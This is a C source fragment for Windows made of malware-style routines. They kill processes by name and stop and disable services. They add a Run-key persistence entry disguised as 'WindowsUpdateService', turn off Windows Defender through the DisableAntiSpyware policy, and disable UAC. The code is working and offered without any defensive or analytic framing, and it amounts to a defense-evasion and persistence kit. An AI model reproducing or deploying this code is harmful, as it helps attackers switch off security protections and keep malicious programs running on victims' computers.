// Function to terminate a process by name
BOOL TerminateProcessByName(const char* processName) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);

    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes) {
        if (_stricmp(pEntry.szExeFile, processName) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
                CloseHandle(hSnapShot);
                return TRUE;
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
    return FALSE;
}

// Function to disable a service by name
BOOL DisableService(const char* serviceName) {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm == NULL) {
        return FALSE;
    }

    SC_HANDLE scService = OpenService(scm, serviceName, SERVICE_ALL_ACCESS);
    if (scService == NULL) {
        CloseServiceHandle(scm);
        return FALSE;
    }

    SERVICE_STATUS status;
    if (!ControlService(scService, SERVICE_CONTROL_STOP, &status)) {
        CloseServiceHandle(scService);
        CloseServiceHandle(scm);
        return FALSE;
    }

    if (!ChangeServiceConfig(scService, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
        CloseServiceHandle(scService);
        CloseServiceHandle(scm);
        return FALSE;
    }

    CloseServiceHandle(scService);
    CloseServiceHandle(scm);
    return TRUE;
}

// Function to add persistence via registry run key
BOOL AddPersistence() {
    HKEY hKey;
    const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "WindowsUpdateService";
    char szPath[MAX_PATH];

    GetModuleFileName(NULL, szPath, MAX_PATH);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);
    return TRUE;
}

// Function to disable Windows Defender via registry
BOOL DisableWindowsDefender() {
    HKEY hKey;
    const char* path = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    DWORD value = 1;

    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    if (RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);
    return TRUE;
}

// Function to disable UAC
BOOL DisableUAC() {
    HKEY hKey;
    const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    DWORD value = 0;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    if (RegSetValueEx(hKey, "EnableLUA", 0, REG_DWORD, (BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);
    return TRUE;
}

